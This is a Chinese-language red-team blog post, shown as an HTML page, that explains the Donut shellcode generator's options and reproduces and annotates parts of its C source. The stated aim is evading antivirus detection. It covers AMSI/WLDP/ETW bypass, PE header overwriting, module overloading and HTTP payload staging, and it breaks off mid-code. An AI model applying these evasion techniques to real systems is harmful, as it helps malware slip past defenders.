<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Donut | Red Team, Malware Development, Code Auditing, Focused on Cybersecurity,C2 Developer,Security Researcher</title><meta name="author" content="cc"><meta name="copyright" content="cc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Donut摘要：动机与成果Donut 作为一个强大的 工具 可以将PE等各种文件格式转成Shellcode ，已成为渗透测试和红队行动中的常用工具。然而，由于其默认的 Loader 结构和 API 调用序列逐渐被安全产品收录，其隐蔽性大不如前。 本文基于 Donut 进行简单免杀化处理，目标是旨在最大化规避静态和动态安全分析。 Donut项目地址: https:&#x2F;&#x2F;github.com&#x2F;TheWo">
<meta property="og:type" content="article">
<meta property="og:title" content="Donut">
<meta property="og:url" content="https://chao112122.github.io/2025/11/16/donut/index.html">
<meta property="og:site_name" content="Red Team, Malware Development, Code Auditing, Focused on Cybersecurity,C2 Developer,Security Researcher">
<meta property="og:description" content="Donut摘要：动机与成果Donut 作为一个强大的 工具 可以将PE等各种文件格式转成Shellcode ，已成为渗透测试和红队行动中的常用工具。然而，由于其默认的 Loader 结构和 API 调用序列逐渐被安全产品收录，其隐蔽性大不如前。 本文基于 Donut 进行简单免杀化处理，目标是旨在最大化规避静态和动态安全分析。 Donut项目地址: https:&#x2F;&#x2F;github.com&#x2F;TheWo">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://chao112122.github.io/img/123.png">
<meta property="article:published_time" content="2025-11-16T11:39:47.638Z">
<meta property="article:modified_time" content="2025-11-16T15:56:24.613Z">
<meta property="article:author" content="cc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://chao112122.github.io/img/123.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Donut",
  "url": "https://chao112122.github.io/2025/11/16/donut/",
  "image": "https://chao112122.github.io/img/123.png",
  "datePublished": "2025-11-16T11:39:47.638Z",
  "dateModified": "2025-11-16T15:56:24.613Z",
  "author": [
    {
      "@type": "Person",
      "name": "cc",
      "url": "https://chao112122.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/123.png"><link rel="canonical" href="https://chao112122.github.io/2025/11/16/donut/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Donut',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Red Team, Malware Development, Code Auditing, Focused on Cybersecurity,C2 Developer,Security Researcher</span></a><a class="nav-page-title" href="/"><span class="site-name">Donut</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Donut<a class="post-edit-link" href="https://github.com/chao112122_posts/donut.md" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-16T11:39:47.638Z" title="发表于 2025-11-16 19:39:47">2025-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-16T15:56:24.613Z" title="更新于 2025-11-16 23:56:24">2025-11-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Donut"><a href="#Donut" class="headerlink" title="Donut"></a>Donut</h1><h2 id="摘要：动机与成果"><a href="#摘要：动机与成果" class="headerlink" title="摘要：动机与成果"></a>摘要：动机与成果</h2><p>Donut 作为一个强大的 工具 可以将PE等各种文件格式转成Shellcode ，已成为渗透测试和红队行动中的常用工具。然而，由于其默认的 Loader 结构和 API 调用序列逐渐被安全产品收录，其隐蔽性大不如前。</p>
<p>本文基于 Donut 进行简单免杀化处理，目标是旨在最大化规避静态和动态安全分析。</p>
<p><strong>Donut项目地址: <a target="_blank" rel="noopener" href="https://github.com/TheWover/donut">https://github.com/TheWover/donut</a></strong></p>
<h2 id="Donut参数介绍"><a href="#Donut参数介绍" class="headerlink" title="Donut参数介绍"></a>Donut参数介绍</h2><h3 id="MODULE-OPTIONS-模块选项"><a href="#MODULE-OPTIONS-模块选项" class="headerlink" title="MODULE OPTIONS (模块选项)"></a>MODULE OPTIONS (模块选项)</h3><p>这组选项主要用于<strong>HTTP 暂存 (Staging)</strong>，即让 shellcode 从一个 Web 服务器上下载并加载您的真实 payload（模块）。</p>
<ul>
<li><strong>-n, –modname: (模块名称)</strong><ul>
<li><strong>作用：</strong> 指定 payload 在服务器上托管时的名称。</li>
<li><strong>二开注意：</strong> 如果启用了 <code>-e</code> (熵)，这个名称会自动随机生成以增加混淆。</li>
</ul>
</li>
<li><strong>-s, –server: (服务器地址)</strong><ul>
<li><strong>作用：</strong> 指定托管 payload 的服务器 URL。这是实现 HTTP Staging 的核心参数。</li>
<li><strong>示例：</strong> <code>https://username:password@192.168.0.1/</code> (支持身份验证)。</li>
</ul>
</li>
<li><strong>-e, –entropy: (熵&#x2F;混淆级别)</strong><ul>
<li><strong>作用：</strong> 这是<strong>关键的免杀&#x2F;混淆选项</strong>。</li>
<li><strong>1 &#x3D; None (无):</strong> 不做任何混淆。</li>
<li><strong>2 &#x3D; Use random names (随机名称):</strong> 自动随机化 <code>-n</code> (模块名) 和 <code>-d</code> (AppDomain 名)。</li>
<li><strong>3 &#x3D; Random names + symmetric encryption (随机名称 + 对称加密):</strong> <strong>(默认)</strong> 不仅随机化名称，还加密 HTTP 通信中的 payload。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="PIC-SHELLCODE-OPTIONS-Shellcode-选项"><a href="#PIC-SHELLCODE-OPTIONS-Shellcode-选项" class="headerlink" title="PIC&#x2F;SHELLCODE OPTIONS (Shellcode 选项)"></a>PIC&#x2F;SHELLCODE OPTIONS (Shellcode 选项)</h3><p>这组选项决定了<strong>最终生成的 shellcode 文件</strong>的特性和格式。</p>
<ul>
<li><strong>-a, –arch: (目标架构)</strong><ul>
<li><strong>作用：</strong> 指定 shellcode 运行的环境。</li>
<li><strong>1 &#x3D; x86</strong> (32位)</li>
<li><strong>2 &#x3D; amd64</strong> (64位)</li>
<li><strong>3 &#x3D; x86+amd64</strong> (32&#x2F;64位兼容) <strong>(默认)</strong></li>
</ul>
</li>
<li><strong>-o, –output: (输出文件)</strong><ul>
<li><strong>作用：</strong> 指定生成的 shellcode 文件的保存路径。默认为 <code>loader.bin</code>。</li>
</ul>
</li>
<li><strong>-f, –format: (输出格式)</strong><ul>
<li><strong>作用：</strong> <strong>非常有用</strong>的功能。决定 shellcode 以什么格式输出，方便您将其嵌入到不同的加载器（Loader）中。</li>
<li><strong>1 &#x3D; Binary (二进制)</strong> <strong>(默认)</strong></li>
<li><strong>2 &#x3D; Base64</strong></li>
<li><strong>3 &#x3D; C 语言数组</strong></li>
<li><strong>4 &#x3D; Ruby</strong></li>
<li><strong>5 &#x3D; Python</strong></li>
<li><strong>6 &#x3D; Powershell</strong></li>
<li><strong>7 &#x3D; C#</strong></li>
<li><strong>8 &#x3D; Hex (十六进制)</strong></li>
</ul>
</li>
<li><strong>-y, –fork: (创建新线程并继续)</strong><ul>
<li><strong>作用：</strong> 一种高级注入技巧。它会为 shellcode 创建一个新线程，<strong>同时</strong>让宿主进程在指定的 <code>&lt;offset&gt;</code> (偏移量) 处<strong>继续执行</strong>。这可以用来保持宿主进程的“活性”，使其看起来更正常。</li>
</ul>
</li>
<li><strong>-x, –exit: (退出行为)</strong><ul>
<li><strong>作用：</strong> 决定 shellcode 执行完毕后如何操作。</li>
<li><strong>1 &#x3D; Exit thread (退出线程)</strong> <strong>(默认)</strong>：最安全，只结束当前线程。</li>
<li><strong>2 &#x3D; Exit process (退出进程)</strong>：如果注入到 <code>explorer.exe</code> 等关键进程，这会导致目标崩溃，<strong>不推荐</strong>。</li>
<li><strong>3 &#x3D; Do not exit (不退出)</strong>：无限期阻塞，适用于需要长久运行的 payload。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="FILE-OPTIONS-文件选项"><a href="#FILE-OPTIONS-文件选项" class="headerlink" title="FILE OPTIONS (文件选项)"></a>FILE OPTIONS (文件选项)</h3><p>这组选项用于描述您<strong>输入的那个文件</strong>（您想要转换成 shellcode 的程序）。</p>
<ul>
<li><strong>-i, –input: (输入文件)</strong><ul>
<li><strong>作用：</strong> <strong>最核心的参数之一</strong>。指定您要转换成 shellcode 的文件路径（例如 <code>mimikatz.exe</code> 或 <code>payload.dll</code>）。</li>
</ul>
</li>
<li><strong>-c, –class: (类名)</strong><ul>
<li><strong>作用：</strong> <strong>(仅 .NET DLL)</strong> 指定 .NET 程序集中包含入口点方法的<strong>完整命名空间和类名</strong>。</li>
<li><strong>示例：</strong> <code>MyNamespace.MyClass</code></li>
</ul>
</li>
<li><strong>-m, –method: (方法&#x2F;函数名)</strong><ul>
<li><strong>作用：</strong><ul>
<li><strong>(.NET DLL):</strong> 指定 <code>-c</code> 类中的<strong>公共静态方法</strong>作为入口点。</li>
<li><strong>(非托管 DLL):</strong> 指定要调用的<strong>导出函数</strong>名称。</li>
</ul>
</li>
</ul>
</li>
<li><strong>-p, –args: (传入参数)</strong><ul>
<li><strong>作用：</strong> 为您的输入文件（DLL 或 EXE）指定命令行参数。</li>
<li><strong>示例：</strong> <code>-p &quot;arg1 arg2&quot;</code></li>
</ul>
</li>
<li><strong>-w, –unicode:</strong><ul>
<li><strong>作用：</strong> 告诉 Donut，您通过 <code>-p</code> 传递给<strong>非托管 DLL</strong> 的参数是 UNICODE 格式（默认为是 ANSI）。</li>
</ul>
</li>
<li><strong>-r, –runtime: (.NET 运行时版本)</strong><ul>
<li><strong>作用：</strong> <strong>(仅 .NET)</strong> 强制 shellcode 加载指定版本的 CLR 运行时。默认会自动检测或使用 v4.0.30319。</li>
</ul>
</li>
<li><strong>-t, –thread:</strong><ul>
<li><strong>作用：</strong> <strong>(仅非托管 EXE)</strong> 将 EXE 的入口点作为新线程执行。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="EXTRA-额外选项"><a href="#EXTRA-额外选项" class="headerlink" title="EXTRA (额外选项)"></a>EXTRA (额外选项)</h3><p>这组选项提供了额外的<strong>免杀和混淆</strong>功能。</p>
<ul>
<li><strong>-z, –compress: (压缩引擎)</strong><ul>
<li><strong>作用：</strong> 压缩输入文件以减小 shellcode 体积。</li>
<li><strong>1 &#x3D; None (无)</strong></li>
<li><strong>2 &#x3D; aPLib</strong> (一种快速的压缩算法)</li>
<li><strong>3 &#x3D; LZNT1, 4 &#x3D; Xpress</strong> (Windows 内置压缩)</li>
</ul>
</li>
<li><strong>-b, –bypass: (绕过级别)</strong><ul>
<li><strong>作用：</strong> <strong>最关键的免杀参数之一</strong>。尝试在内存中 Patch (修补) Windows 的安全检测机制。</li>
<li><strong>AMSI</strong> (反恶意软件扫描接口)</li>
<li><strong>WLDP</strong> (Windows 锁定策略)</li>
<li><strong>ETW</strong> (Windows 事件跟踪)</li>
<li><strong>1 &#x3D; None (不绕过)</strong></li>
<li><strong>2 &#x3D; Abort on fail (失败时中止)</strong>：如果绕过失败，shellcode 停止执行。</li>
<li><strong>3 &#x3D; Continue on fail (失败时继续)</strong> <strong>(默认)</strong>：即使绕过失败，也继续尝试执行 payload。</li>
</ul>
</li>
<li><strong>-k, –headers: (PE 头)</strong><ul>
<li><strong>作用：</strong> 决定在内存中是否保留 PE 头。</li>
<li><strong>1 &#x3D; Overwrite (覆盖)</strong> <strong>(默认)</strong>：覆盖 PE 头，可能绕过某些内存扫描。</li>
<li><strong>2 &#x3D; Keep all (保留)</strong>：保留 PE 头。</li>
</ul>
</li>
<li><strong>-j, –decoy: (诱饵模块)</strong><ul>
<li><strong>作用：</strong> 一种高级的<strong>模块过载 (Module Overloading)</strong> 技术。指定一个合法的模块路径（如 <code>C:\Windows\System32\some.dll</code>），Donut 会将 shellcode 注入到该模块的内存空间中，使其在内存中”伪装”成那个合法模块，以躲避内存扫描。</li>
</ul>
</li>
</ul>
<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">DONUT_CONFIG c;</span><br><span class="line"><span class="type">int</span>          err;</span><br><span class="line"><span class="type">char</span>         *mod_type;</span><br><span class="line"><span class="type">char</span>         *arch_str[<span class="number">3</span>] = &#123; <span class="string">&quot;x86&quot;</span>, <span class="string">&quot;amd64&quot;</span>, <span class="string">&quot;x86+amd64&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span>         *inst_type[<span class="number">2</span>]= &#123; <span class="string">&quot;Embedded&quot;</span>, <span class="string">&quot;HTTP&quot;</span> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  [ Donut shellcode generator v1 (built &quot;</span> __DATE__ <span class="string">&quot; &quot;</span> __TIME__ <span class="string">&quot;)\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  [ Copyright (c) 2019-2021 TheWover, Odzhan\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;c, <span class="number">0</span>, <span class="keyword">sizeof</span>(c));</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认的donut配置</span></span><br><span class="line">c.inst_type = DONUT_INSTANCE_EMBED;   <span class="comment">// file is embedded</span></span><br><span class="line">c.arch      = DONUT_ARCH_X84;         <span class="comment">// dual-mode (x86+amd64)</span></span><br><span class="line">c.bypass    = DONUT_BYPASS_CONTINUE;  <span class="comment">// continues loading even if disabling AMSI/WLDP/ETW fails</span></span><br><span class="line">c.headers   = DONUT_HEADERS_OVERWRITE;<span class="comment">// overwrites PE headers</span></span><br><span class="line">c.format    = DONUT_FORMAT_BINARY;    <span class="comment">// default output format</span></span><br><span class="line">c.compress  = DONUT_COMPRESS_NONE;    <span class="comment">// compression is disabled by default</span></span><br><span class="line">c.entropy   = DONUT_ENTROPY_DEFAULT;  <span class="comment">// enable random names + symmetric encryption by default</span></span><br><span class="line">c.exit_opt  = DONUT_OPT_EXIT_THREAD;  <span class="comment">// default behaviour is to exit the thread</span></span><br><span class="line">c.unicode   = <span class="number">0</span>;                      <span class="comment">// command line will not be converted to unicode for unmanaged DLL </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解析参数</span></span><br><span class="line">get_opt(argc, argv, OPT_TYPE_NONE,   <span class="literal">NULL</span>,       <span class="string">&quot;h;?&quot;</span>, <span class="string">&quot;help&quot;</span>,            usage);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.arch,    <span class="string">&quot;a&quot;</span>,   <span class="string">&quot;arch&quot;</span>,            validate_arch);<span class="comment">//文件架构</span></span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.bypass,  <span class="string">&quot;b&quot;</span>,   <span class="string">&quot;bypass&quot;</span>,          validate_bypass);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.headers, <span class="string">&quot;k&quot;</span>,   <span class="string">&quot;headers&quot;</span>,         validate_headers);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.cls,      <span class="string">&quot;c&quot;</span>,   <span class="string">&quot;class&quot;</span>,           <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.domain,   <span class="string">&quot;d&quot;</span>,   <span class="string">&quot;domain&quot;</span>,          <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.entropy, <span class="string">&quot;e&quot;</span>,   <span class="string">&quot;entropy&quot;</span>,         validate_entropy);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.format,  <span class="string">&quot;f&quot;</span>,   <span class="string">&quot;format&quot;</span>,          validate_format);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.input,    <span class="string">&quot;i&quot;</span>,   <span class="string">&quot;input;file&quot;</span>,      <span class="literal">NULL</span>);<span class="comment">// 输入的文件路径</span></span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.method,   <span class="string">&quot;m&quot;</span>,   <span class="string">&quot;method;function&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.modname,  <span class="string">&quot;n&quot;</span>,   <span class="string">&quot;modname&quot;</span>,         <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.decoy,    <span class="string">&quot;j&quot;</span>,   <span class="string">&quot;decoy&quot;</span>,           <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.output,   <span class="string">&quot;o&quot;</span>,   <span class="string">&quot;output&quot;</span>,          <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.args,     <span class="string">&quot;p&quot;</span>,   <span class="string">&quot;params;args&quot;</span>,     <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.runtime,  <span class="string">&quot;r&quot;</span>,   <span class="string">&quot;runtime&quot;</span>,         <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_STRING, c.server,   <span class="string">&quot;s&quot;</span>,   <span class="string">&quot;server&quot;</span>,          <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_FLAG,   &amp;c.thread,  <span class="string">&quot;t&quot;</span>,   <span class="string">&quot;thread&quot;</span>,          <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_FLAG,   &amp;c.unicode, <span class="string">&quot;w&quot;</span>,   <span class="string">&quot;unicode&quot;</span>,         <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.exit_opt,<span class="string">&quot;x&quot;</span>,   <span class="string">&quot;exit&quot;</span>,            validate_exit);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_HEX,    &amp;c.oep,     <span class="string">&quot;y&quot;</span>,   <span class="string">&quot;oep;fork&quot;</span>,        <span class="literal">NULL</span>);</span><br><span class="line">get_opt(argc, argv, OPT_TYPE_DEC,    &amp;c.compress,<span class="string">&quot;z&quot;</span>,   <span class="string">&quot;compress&quot;</span>,        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// no file? show usage and exit</span></span><br><span class="line"><span class="keyword">if</span>(c.input[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">  usage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// server specified?</span></span><br><span class="line"><span class="keyword">if</span>(c.server[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">  c.inst_type = DONUT_INSTANCE_HTTP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// generate loader from configuration</span></span><br><span class="line"><span class="comment">//DonutCreate核心我们关注的地方</span></span><br><span class="line">err = DonutCreate(&amp;c); <span class="comment">//处理文件 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(err != DONUT_ERROR_OK) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  [ Error : %s\n&quot;</span>, DonutError(err));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后面不重要了 都是输出的信息</span></span><br><span class="line"><span class="keyword">switch</span>(c.mod_type) &#123;</span><br><span class="line">  <span class="keyword">case</span> DONUT_MODULE_DLL:</span><br><span class="line">    mod_type = <span class="string">&quot;DLL&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DonutCreate</span><span class="params">(PDONUT_CONFIG c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> err = DONUT_ERROR_OK;</span><br><span class="line">    </span><br><span class="line">    DPRINT(<span class="string">&quot;Entering.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    c-&gt;mod = c-&gt;pic = c-&gt;inst = <span class="literal">NULL</span>;</span><br><span class="line">    c-&gt;mod_len = c-&gt;pic_len = c-&gt;inst_len = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. validate the loader configuration</span></span><br><span class="line">    err = validate_loader_cfg(c);</span><br><span class="line">    <span class="keyword">if</span>(err == DONUT_ERROR_OK) &#123;</span><br><span class="line">      <span class="comment">// 2. get information about the file to execute in memory</span></span><br><span class="line">      err = read_file_info(c);</span><br><span class="line">      <span class="keyword">if</span>(err == DONUT_ERROR_OK) &#123;</span><br><span class="line">        <span class="comment">// 3. validate the module configuration</span></span><br><span class="line">        err = validate_file_cfg(c);</span><br><span class="line">        <span class="keyword">if</span>(err == DONUT_ERROR_OK) &#123;</span><br><span class="line"><span class="comment">//这部分都是验证</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">          <span class="comment">//这三步比较重要</span></span><br><span class="line">          <span class="comment">// 4. build the module</span></span><br><span class="line">          err = build_module(c); <span class="comment">//初步处理</span></span><br><span class="line">          <span class="keyword">if</span>(err == DONUT_ERROR_OK) &#123;</span><br><span class="line">            <span class="comment">// 5. build the instance</span></span><br><span class="line">            err = build_instance(c);</span><br><span class="line">            <span class="keyword">if</span>(err == DONUT_ERROR_OK) &#123;</span><br><span class="line">              <span class="comment">//构造一个加载器</span></span><br><span class="line">              <span class="comment">// 6. build the loader</span></span><br><span class="line">              err = build_loader(c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">//后面都不重要</span></span><br><span class="line">              <span class="keyword">if</span>(err == DONUT_ERROR_OK) &#123;</span><br><span class="line">                